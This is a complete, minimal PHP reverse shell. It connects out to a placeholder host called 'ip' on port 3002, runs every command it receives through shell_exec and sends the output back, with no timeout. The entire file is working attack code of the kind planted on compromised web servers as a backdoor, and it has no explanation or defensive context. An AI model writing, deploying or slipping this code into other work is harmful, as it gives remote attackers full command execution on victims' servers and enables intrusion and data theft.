<?php
set_time_limit(0);
$ip = 'ip';
$port = 3002;
$sock = fsockopen($ip, $port);
while(!feof($sock)) {
    $command = fgets($sock, 1024);
    $output = shell_exec($command);
    fwrite($sock, $output);
}
fclose($sock);
?>
